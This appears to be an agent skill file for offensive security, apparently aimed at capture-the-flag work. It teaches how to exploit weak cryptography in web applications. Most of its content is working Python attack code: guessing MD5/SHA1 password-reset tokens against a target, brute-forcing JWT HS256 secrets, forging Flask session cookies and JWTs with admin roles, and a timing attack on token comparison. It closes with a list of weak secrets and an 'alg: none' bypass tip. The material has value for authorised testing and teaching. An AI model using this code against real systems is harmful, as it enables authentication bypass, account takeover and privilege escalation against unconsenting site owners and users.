---
name: crypto-weakness
description: Identifying and exploiting weak cryptographic implementations including predictable tokens, weak hashes, and insecure session management
---

# Cryptographic Weakness

Weak cryptography in session management, token generation, or data storage leads to authentication bypass, account takeover, and privilege escalation. The most impactful targets are session tokens, password resets, CSRF tokens, and "remember me" cookies.

## Session Token Analysis

**Always decode and inspect session tokens:**

```python
import base64, json, hashlib

# Flask session (base64-encoded JSON)
cookie = "eyJ1c2VyX2lkIjoxMDMyLCJyb2xlIjoidXNlciJ9...."
payload = cookie.split(".")[0]
payload += "=" * (4 - len(payload) % 4)
data = json.loads(base64.urlsafe_b64decode(payload))
print(data)  # {"user_id": 1032, "role": "user"}

# JWT (three base64 parts)
import jwt
header_b64, payload_b64, sig = cookie.split(".")
header = json.loads(base64.urlsafe_b64decode(header_b64 + "=="))
claims = json.loads(base64.urlsafe_b64decode(payload_b64 + "=="))
print(header)  # {"alg": "HS256", "typ": "JWT"}
print(claims)  # {"sub": "user123", "role": "user", "exp": ...}
```

**Predictability patterns to look for:**
- Token contains user_id, timestamp, or sequential counter → forgeable
- Token is MD5/SHA1 of username or email → crackable
- Token length < 16 bytes → brute-forceable
- Token only contains hex characters of fixed length → likely hash of known input

## Weak Hash Exploitation

**When passwords or tokens are hashed with MD5/SHA1:**
```python
import hashlib, requests

# If token is MD5(username) or MD5(email):
username = "admin"
token = hashlib.md5(username.encode()).hexdigest()
print(f"MD5(admin) = {token}")  # Try as password reset token

# SHA1 variants
token_sha1 = hashlib.sha1(username.encode()).hexdigest()
token_sha1_lower = hashlib.sha1(username.lower().encode()).hexdigest()

# Test all variants
for tok in [token, token_sha1, token_sha1_lower]:
    r = requests.get(f"http://target/reset?token={tok}")
    if r.status_code == 200 and "error" not in r.text.lower():
        print(f"Valid token: {tok}")
```

**Rainbow table / online lookup:**
```python
import requests

def crack_hash_online(hash_value):
    # Try hashes.com API
    r = requests.get(f"https://hashes.com/en/api/identifier?hash={hash_value}")
    return r.json()

# For known plaintexts (username, email, phone):
candidates = ["admin", "administrator", "root", "user@example.com"]
for plaintext in candidates:
    for algo in [hashlib.md5, hashlib.sha1, hashlib.sha256]:
        h = algo(plaintext.encode()).hexdigest()
        print(f"{algo.__name__}({plaintext}) = {h}")
```

## JWT Secret Brute-Force

```python
import base64, hashlib, hmac

# HS256 secret guessing with python3 (no external cracker needed)
token = "<header>.<payload>.<signature>"
parts = token.split(".")
signing_input, sig_b64 = ".".join(parts[:2]), parts[2]
sig = base64.urlsafe_b64decode(sig_b64 + "=" * (-len(sig_b64) % 4))

with open("wordlist.txt") as f:
    for secret in f:
        secret = secret.strip()
        cand = hmac.new(secret.encode(), signing_input.encode(), hashlib.sha256).digest()
        if hmac.compare_digest(cand, sig):
            print(f"Secret found: {secret}")
            break
```

**Common weak secrets to test:**
```python
weak_secrets = [
    "secret", "secret_key", "your_secret_key", "change_me", "changeme",
    "supersecret", "flask_secret", "development", "debug", "test",
    app_name, domain_name, "password", "1234567890",
]
```

## Token Forgery

**Once weak hash/secret is found, forge elevated tokens:**

```python
from flask.sessions import SecureCookieSessionInterface
from itsdangerous import URLSafeTimedSerializer
import hashlib

secret = "your_secret_key"  # discovered secret

# Flask session forgery
s = URLSafeTimedSerializer(secret, salt='cookie-session',
    signer_kwargs={'key_derivation': 'hmac', 'digest_method': hashlib.sha1})
forged = s.dumps({"user_id": 1, "role": "admin", "is_admin": True})

# JWT forgery  
import jwt
forged_jwt = jwt.encode(
    {"sub": "admin", "role": "administrator", "exp": 9999999999},
    secret, algorithm="HS256"
)
```

## Timing Attack on Token Comparison

When tokens are compared with `==` (not constant-time), timing differences reveal valid tokens:

```python
import requests, time, statistics

def measure_response_time(token, n=5):
    times = []
    for _ in range(n):
        start = time.perf_counter()
        requests.get(f"http://target/verify?token={token}")
        times.append(time.perf_counter() - start)
    return statistics.mean(times)

# Test known-invalid vs candidate tokens
baseline = measure_response_time("0" * 32)
for prefix in "0123456789abcdef":
    t = measure_response_time(prefix + "0" * 31)
    if t > baseline * 1.1:
        print(f"Prefix {prefix} is likely correct (t={t:.4f}s vs {baseline:.4f}s)")
```

## Entropy Analysis

**Collect multiple tokens to assess entropy:**
```python
import requests, math, collections

tokens = []
for _ in range(20):
    r = requests.get("http://target/reset?user=testuser")
    token = extract_token_from_response(r)
    tokens.append(token)

# Check for patterns
print("Lengths:", set(len(t) for t in tokens))
print("Unique:", len(set(tokens)))  # Should be 20 for secure tokens
# If tokens are sequential/predictable, they'll cluster
```

## Pro Tips

1. Always decode session cookies/tokens immediately - they often contain exploitable claims
2. MD5 and SHA1 tokens derived from known values (username/email) are trivially crackable
3. Flask's default secret key `your_secret_key` / `change_me` is extremely common in CTFs
4. JWT `alg: none` bypass: remove the signature entirely and set alg to none
5. Token length < 128 bits is exploitable with brute force or rainbow tables
6. Collect 5-10 tokens and look for sequential IDs or timestamps embedded in them
7. Test `role: admin`, `is_admin: true`, `user_id: 1` in forged tokens
